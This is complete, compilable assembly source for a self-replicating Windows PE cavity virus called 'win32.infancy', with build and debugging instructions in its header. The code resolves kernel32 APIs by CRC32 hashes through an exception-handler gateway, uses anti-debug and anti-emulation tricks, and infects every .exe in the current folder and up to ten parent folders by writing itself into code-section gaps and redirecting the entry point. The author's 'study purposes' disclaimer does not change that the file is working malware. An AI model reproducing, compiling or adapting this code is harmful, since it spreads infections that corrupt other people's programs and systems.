;????????????????????????????????????????????????????????????????????????????»
;? win32.infancy (c)oded by shitdown [mions] in feb-18-2001, alfa version    ?
;? non-dangerous, non-resident pe cavity ring3 direct-action infector        ? 
;?????????????????????????????????????????????????????????????????????????????
;? this code is optimised for size by technique, not by asm :(               ?
;?????????????????????????????????????????????????????????????????????????????
;?????????????????????????????????????????????????????????????????????????????
;? description:?                                                             ?
;???????????????                                                             ?
;?  name       : win32.infancy (win32 teoretically, tested on win98 :-)      ?
;?  author     : shitdown (http://shitdown.sf.cz, email: shitdown@sf.cz)     ?
;?  origin     : czech republic                                              ?
;?  size       : 540 bytes                                                   ?
;?  infects    : .exe pe files                                               ?
;?  payload    : no                                                          ?
;?  strings    : no                                                          ?  
;?  encrypt    : no                                                          ?
;?  resident   : no                                                          ?
;?  cavity     : yes                                                         ?
;?  anti-debug : yes, 0cch api callgate fucks td32                           ?
;?  anti-emu   : yes,non-standard playing with seh                           ? 
;?  anti-av    : no                                                          ?
;?????????????????????????????????????????????????????????????????????????????
;?  simple example tiny virus, shows how to use                              ?
;?  structured exception handling                                            ?
;?  kernel is determined by standard way (pop eax/push eax)                  ?
;?  at start, apis is located at fly (when is needed)                        ?
;?  ( push crc32 of api / int 3 ) - crc32 api names,                         ?
;?  virus can be easy detected / cleaned by generic scaner                   ?
;?  virus doesn't needs write permission to section -                        ?
;?  - all variables will be allocated dynamically on stack                   ?
;?  virus searches & infects all files in 10 up-directories;                 ?
;?  (cd .. / infect_all, cd .. / infect_all :)                               ?
;?  this cute code is designed to use 'holes' in code                        ?
;?  section, virus doesn't increase host size.                               ?
;?  this code is not purposed to be world-wide :)                            ?
;?  so, only for study purposes.                                             ?
;?                                                                           ? 
;?how to compile:                                                            ? 
;? tasm32 -ml -m9 -q -zn -z infancy.asm                                      ? 
;? tlink32 -r -m -s -M -Tpe -c -ap infancy.obj                               ? 
;?how to debug:                                                              ? 
;? set 'softice' definition to '1', compile, go to softice and type          ? 
;?'i1here on' and run infancy.exe file.                                      ? 
;????????????????????????????????                                            ? 
;?fuck the windows, linux rocks!?                                            ?
;????????????????????????????????????????????????????????????????????????????? 
                .386p                                      ;nice machines :)
                .model  flat                               ;why ? why not !    
softice         =       0                                                      
dir_depth       =       10                                 ;10 up-directories  
                .data    
dummy           dd      ?                                                      
;                          ?????????????????
;??????????????????????????? needed macroz ???????????????????????????????????
;                          ?????????????????
;                       
;???????????????
;? crc32 macro ?
;???????????????
crc32_magic     =       0c1a7f39ah
                crc32   macro string
crcreg          =       0ffffffffh
                irpc    _x, <string>
ctrlbyte        =       ('&_x&' and 0dfh) xor (crcreg and 0ffh)
crcreg          =       crcreg shr 8
                rept    8                 
ctrlbyte        =       (ctrlbyte shr 1) xor (crc32_magic * (ctrlbyte and 1))
                endm     
crcreg          =       crcreg xor ctrlbyte
                endm     
                dd      crcreg
                endm     
;??????????????????  
;? api call macro ?
;??????????????????     
                api     macro apiname
                db      68h
                crc32   <apiname>
                db      0cch     
                endm     

;????????????????????????????
;? softice breakpoint macro ?
;????????????????????????????
                break   macro             
                if      softice
                int     01
                endif    
                endm     

;                       ????????????????????????????
;???????????????????????? here starts code section ???????????????????????????
;                       ????????????????????????????
                .code    
go:                     
virus_start:            
;??????????????????????????????????????????????????????
;? try to get kernel address, using 'standard' method ?
;? pop eax / push eax, function is protected by seh   ?
;??????????????????????????????????????????????????????
                pop     eax                                ;kernel address
                push    eax                                ;to eax
                xor     ax, ax                                    
k32_scan_next:          
                push    eax                                ;for restorin'
                                                           ;by seh
                call    set_k32_scan_seh                          
k32_scan_seh:           
                pop     ecx                                ;esp+8
                pop     ecx                                      
                pop     esp                                ;mov esp, [esp+8]
k32_scan_mismatch:       
                pop     ecx                                ;remove old seh
                pop     ecx                                               

                pop     eax                                ;restore last
                                                           ;kernel address 
                add     eax, 0-10000h                                
                jmp     short k32_scan_next                ;try again

set_k32_scan_seh:        
                xor     ecx, ecx                                     
                push    ecx                                          
                mov     dword ptr fs:[ecx], esp                      

                cmp     word ptr [eax], 5a4dh                        
                jne     short k32_scan_mismatch                      
k32_found:              
                pop     eax                                ;remove old seh
                pop     ecx                                          
                pop     ebp
                        
;?????????????????????? create handler for virus-services ?????????????????????
                call    get_handler_offset
;????????????????????????????????????????????????????????????????????
;? here is an entrypoint of exception gate, if any exception occurs ?
;? (including 0cch opcode call), this code will be executed         ?
;????????????????????????????????????????????????????????????????????
exception_handler:       
                pushad                                     ;save all registerz
                mov     esi, [esp+4+20h]                   ;exception code
                lodsb                                      ;exception number
                cmp     al, 3                              ;virus request ?
                je      short exception_virus_request      ;yah
;????????????????????????????????????????????????????????????????
;? only handled exception is int 0x3 - virus api gateway, other ?
;? exceptions is page faults, invalid opcodes etc, then virus   ?
;? tryes jump to original host                                  ?
;????????????????????????????????????????????????????????????????
other_exception:        
                break    
                mov     esp, [esp+8+20h]                       
                pop     eax                                ;remove old seh handler
                pop     eax                                    
                call    get_eip                                
get_eip:                
                db      81h, 2ch, 24h                      ;sub [esp], old_host
old_host        dd      -((offset fake_host-offset go)-(offset get_eip-offset go))
                ret      
;??? virus interrupt / request                                 
exception_virus_request:  
                mov     esi, [esp+0ch+20h]                 ;context-block       
                add     esi, 0b4h                          ;pointer 
                lodsd                                      ;to saved ebp   
                xchg    eax, ebp                           ;ebp-base of kernel
                mov     edi, esi                           ;for edi storing
                lodsd                                      ;load eip to eax
                xchg    eax, esi                           ;in esi is eip  

;??? fix win9x bug      
                lodsb    
                cmp     al, 0cch                                           
                je      short no_w9x_bug                                   
                dec     esi                                                
no_w9x_bug:             
;???????????????????????????????????????????                               
;? in esi is return addres (after int 03h) ?                               
;? in edi is pointer to stack stored eip   ?
;???????????????????????????????????????????                               
                mov     ebx, [edi+12]                      ;esi points to dword on stack
                xchg    [ebx], esi                         ;xchange crc32 <> return addr
                mov     ebx, esi                           ; :( crc32 to ebx
;?????????????????????????????????????????
;? okay, now i must call those crazy api ?
;? in ebp is kernel address              ?
;?????????????????????????????????????????
                mov     esi, [ebp+3ch]                     ;pe header to esi
                mov     esi, [esi+ebp+78h]                 ;export table to esi
                lea     esi, [esi+ebp+1ch]                 ;offset of 'address table'
                lodsd                                      ;address table
                push    eax                                ;save 'address table'
                lodsd                                      ;name table to eax
                push    esi                                ;save pointer to ordinal table
                lea     esi, [eax+ebp]      
                mov     ecx, ebp                           ;counter of api
try_next_api_name:       
                lodsd                                      ;in eax pointer to string
                add     eax, ebp          

;???? crc32 code ?????????????????????????????????????????????????????????????
;?  ? input: eax - offset to name ?                                          ?
;   ? output:edx - crc32          ?                                             
;   ???????????????????????????????       
get_crc32:              
                push    esi
                xchg    eax, esi
                xor     edx, edx
                dec     edx
crc_next_byte:          
                lodsb    
                and     al, 0dfh			;i hate uppercase :)
                jz      short crc_finish
                xor     dl, al
                mov     al, 08h
crc_next_bit:           
                shr     edx, 01h
                jnc     short crc_no_change
                xor     edx, crc32_magic  
crc_no_change:          
                dec     al
                jnz     short crc_next_bit
                jmp     short crc_next_byte
crc_finish:             
                pop     esi
;?                                                                           ?
;?????????????????????????????? end of crc32 ?????????????????????????????????
                inc     ecx
                inc     ecx     
                cmp     edx, ebx                           ;hit ?
                jne     short try_next_api_name
;????????????????????????????????????????????
;? yahooo, api hit!                         ?
;? in ecx is api index (starting from 1 !!) ?
;????????????????????????????????????????????
                pop     esi                                ;restore *ordinal_table
                lodsd                                      ;in eax pointer to ordinal table
                movzx   ecx, word ptr [eax+ecx-2]          ;in ecx is now ordinal (0..x)
                pop     eax                                ;in esi is ptr address table
                add     eax, ebp
                mov     eax, [ecx*4+eax]                   ;and jump to api :)
                add     eax, ebp          
                stosd    
                popad    
                xor     eax, eax
                ret      

;?                                                                           ?
;???????????????????????????? end of virus-handler ???????????????????????????
;????????????????????????? here starts infection engine ??????????????????????
;?                                                                           ?

infect:                 
                xor     esi, esi
                lea     ebx, [esp+44+2*4]                  ;filename to ebx
;??? at first, i must open file for read & write
                push    esi                                ;file attributes
                push    esi                                ;""
                push    3                                  ;open existing
                push    esi                                ;security=default
                push    esi                                ;no sharing
                push    0c0000000h                         ;generic read & write
                push    ebx                                ;file name
                api     <createfilea>                      ;open!
                inc     eax                                ;-1+1=0 ?
                jnz     short infect_continue
                retn     
infect_continue:                                           ;       yes, this is error
                dec     eax                                ; handle to eax
                push    eax                                ;save for future use

;??? now create file mapping
                push    esi                                ;no filename handle
                push    dword ptr [esp+32+4*4]             ;maximal size of file
                push    esi                                ;no min. size
                push    4                                  ;page read & write
                push    esi                                ;no security
                push    eax                                ;mapped file handle
                api     <createfilemappinga>
                push    eax                                ;save for future use

;??? and map file to memory
                push    dword ptr [esp+32+4*4]             ;count of bytes to map
                push    esi                                ;blah...
                push    esi                                ;
                push    2                                  ;read & write
                push    eax                                ;map-handle
                api     <mapviewoffile>
;??? yahoo, in eax is mapped file
                mov     ebx, eax
                cmp     word ptr [eax], 5a4dh              ;exe file ?
                jne     short @unmap_file
                cmp     word ptr [eax+18h], 0040h
@unmap_file:            
                jne     short @@unmap_file
                add     ebx, [eax+3ch]
                cmp     word ptr [ebx], 4550h              ;is this pe header ?
@@unmap_file:   jne     short unmap_file                   ;no

                xchg    edx, eax                           ;imagebase to edx
                push    ebx                                ;save pe header
                break    
                movzx   eax, word ptr [ebx+14h]                           
                add     ebx, eax                                          
                test    byte ptr [ebx+18h+24h], 20h        ;executable ?  
                jz      short _unmap_file                  ;no :(         
code_section_found:      
;??? okay, in ebx+18h is section record
                break   
                mov     ecx, dword ptr [ebx+18h+10h]       ;raw_size
                cmp     ecx, dword ptr [ebx+18h+08h]       ;raw_size>virtual size ?    
                jc      short _unmap_file                  ;raw size too small, go away
                mov     esi, [ebx+18h+14h]                 ;raw address of section in esi
                add     esi, edx                           ;esi points to start of .code
                mov     eax, [ebx+18h+0ch]                 ;relative virt. addr to eax
;????????????????????????????????????????????????????????????????????     
;? esi - pointer to code, ecx - count of bytes left, edi - counter  ?     
;? eax - offset of cave (rva)                                       ?     
;????????????????????????????????????????????????????????????????????     

;???? current stack dump ????????????????????»                            
;? [esp]    ? memory mapped pe header        ?                            
;? [esp+4]  ? map handle                     ?                            
;? [esp+8]  ? file handle                    ?                            
;? [esp+12] ? offset of after_infect: label  ?                            
;? [esp+16] ? file search handle             ?                            
;? [esp+20] ? start of win32_find_data       ?                            
;? [esp+48] ? 100% null-filled 4bytes :))    ?                            
;?????????????????????????????????????????????                            
;                push    dword ptr [ebx+0ch+18h]            ;save virtual addr
;                mov     dword ptr [esp+20], [ebx+0ch+18h]                
                xor     edi, edi                                          
hole_mismatch:          
                add     [esp+48], edi                                     
                add     esi, edi                                          
                xor     edi, edi                                          
                push    esi                                ;save address  
holes_search:           
                dec     ecx                                               
                pop     eax                                ;clean stack   
                js      short _unmap_file                                 
                push    eax                                               
                inc     edi                                ;counter of found bytes
                lodsb    
                test    al, al                                            
                jz      short holes_search                                
                cmp     al, 0cch                                          
                jz      short holes_search                                
                cmp     al, 0c3h                                          
                jz      short holes_search                                
hole_end:               
                db      66h, 81h, 0ffh                     ;cmp di, virus_size
                dw      virus_size+4                                      

                pop     esi                                ;restore saved address
                jc      short hole_mismatch                ;no :(
                break
hole_found:             
                lodsd    
;??????????????????????????????????????????????????????                   
;? yah, in stack is rva of cave, in esi cave address  ?                   
;? in edi size of cave                                ?                   
;??????????????????????????????????????????????????????                   
;                push    dword ptr [ebx+18h+10h]            ;raw  size    
;                pop     dword ptr [ebx+18h+08h]            ;=virtual size

                mov     edi, esi                           ;in edi offset of cave
                mov     esi, [esp+12]                      ;offset infect to esi
                sub     esi, offset after_infect - offset go ;offset of go to esi
; push esi                                                                
                mov     ecx, virus_size                    ;virus size to ecx
                rep     movsb                              ;and move the virus !!
; pop esi    ;in esi offset of infect:                                    
;??? in edi is offset virus_end                                           
                sub     edi, virus_end-old_host                           
                mov     ecx, [esp+48]                      ;addres relative to cave
                lea     ecx, [ecx+4]                                      
                add     ecx, [ebx+0ch+18h]                 ;rva of section
                pop     ebx                                ;pe header in ebx

                lea     eax, [ecx+get_eip-go]          

                xchg    [ebx+28h], ecx                     ;set entrypoint to virus
                sub     eax, ecx                       
;?????????????????????????????????????????????????????????????????????
;? old_host = rva_of_virus+(offset get_eip-offset go)-entrypoint_rva ?
;?????????????????????????????????????????????????????????????????????
                stosd                                      ;and store return adress
                push    eax  
_unmap_file:            
                xchg    edx, eax                                       
                pop     ecx                                ;remove shit (pe header)
;unmaps file, in eax must be address of mapped file                    
unmap_file:             
                push    eax                                            
                api     <unmapviewoffile>                              
                db      0bbh                               ;mov ebx, crc32 <closehandle>
                crc32   <closehandle>                                  
                push    ebx                                            
                db      0cch                               ;close mapping handle
                pop     edi  
                lea     esi, [esp+20+2*4]
                push    esi
                sub     esi, 8
                push    esi
                sub     esi, 8
                push    esi
                push    edi               
                api     <setfiletime>
                push    edi
                push    ebx
                db      0cch                               ;close file handle

                push    21h                                ;make file read-only
                add     esi, 40h
                push    esi    
                api     <setfileattributesa>
unmap_file_end:         
infect_file_end:        
                retn     

infect_end:             

;? old_host = rva_of_virus+(offset get_eip-offset go)-entrypoint_rva         ?
;?????????????????????????? here ends infection engine ???????????????????????


get_handler_offset:      
;--- setup handler for virus services / exeption handling
                break    
                push    eax               
                mov     dword ptr fs:[eax], esp
                push    dir_depth

                mov     ah, 2                              ;512
                sub     esp, eax                           ;place for old directory
                push    esp                                ;buffer offset          
                push    eax                                ;buffer len             
                xchg    eax, ebx
                api     <getcurrentdirectorya>

;???????????????????????????????????????????????????????
;? main infection routine:                             ?
;? searches for *.exe and for ..\*.exe and infect them ?
;???????????????????????????????????????????????????????
                sub     esp, ebx                           ;size of (ffdata)
find_first:             
                push    esp                                ;offset of data buffer
                call    get_mask
                db      "*.exe", 0
get_mask:               
                api     <findfirstfilea>
dir_search:             

                push    eax                                ;save search handle
                call    infect
after_infect:           
                pop     esi
 
                push    esp
                push    esi
                api     <findnextfilea>
                dec     eax
                xchg    eax, esi
                jz      short dir_search
next_directory:         
                push    eax
                api     <findclose>                        ;close search handle

                mov     dword ptr [esp], '..'
                push    esp
                db      0bbh
                crc32   <setcurrentdirectorya>
                push    ebx
                db      0cch
; api <setcurrentdirectorya>  ;go to next up directory

                dec     dword ptr [esp+1024]
                jnz     short find_first
                cdq                                        ;edx=0

                mov     dh, 2
                add     esp, edx
                push    esp
                push    ebx               
                db      0cch
; api <setcurrentdirectorya>
                int     4

virus_end:              
virus_size      =       $-virus_start

;???????????????????
;?end of virus game?
;???????????????????
;                              ??????????????????
;??????????????????????????????? fake host part ??????????????????????????????
;                              ??????????????????
msg:                    
                db      "win32.infancy."
                db      '0'+virus_size/100 mod 10
                db      '0'+virus_size/10 mod 10
                db      '0'+virus_size mod 10
                db      13, 10, "(c)oded by shitdown in jul-2000, http://shitdown@sf.cz, shitdown@sf.cz", 13, 10
                db      "welcome to first generation!", 13, 10
msg_len         =       $-msg

                db      1024 dup(?)

fake_host:              
;--------------- same kernel scanner
                pop     eax                                ;kernel address to eax
                push    eax
                xor     ax, ax
_k32_scan_next:         
                push    eax                                ;for restorin' by seh

                call    _set_k32_scan_seh
_k32_scan_seh:          
                pop     ecx                                ;esp+8
                pop     ecx
                pop     esp                                ;mov esp, [esp+8]
_k32_scan_mismatch:      
                pop     eax                                ;restore last kernel address

                pop     ecx                                ;remove old seh
                pop     ecx

                add     eax, 0-10000h     
                jmp     short _k32_scan_next               ;try again

_set_k32_scan_seh:       
                push    eax
                xor     ecx, ecx
                mov     dword ptr fs:[ecx], esp

                cmp     word ptr [eax], 5a4dh
                jne     _k32_scan_mismatch
_k32_found:             
                pop     ebp                                ;eax
                pop     eax                                ;remove old seh
                pop     eax

;-----------------------------------      

                xor     ecx, ecx
                push    offset exception_handler
                push    ecx               
                mov     dword ptr fs:[0], esp

                push    -11                                ;get a standard handle
                api     <getstdhandle>

                push    0
                push    offset dummy
                push    msg_len
                push    offset msg
                push    eax
                api     <writefile>

                push    0
                api     <exitprocess>
                end     go

;heh, thats all
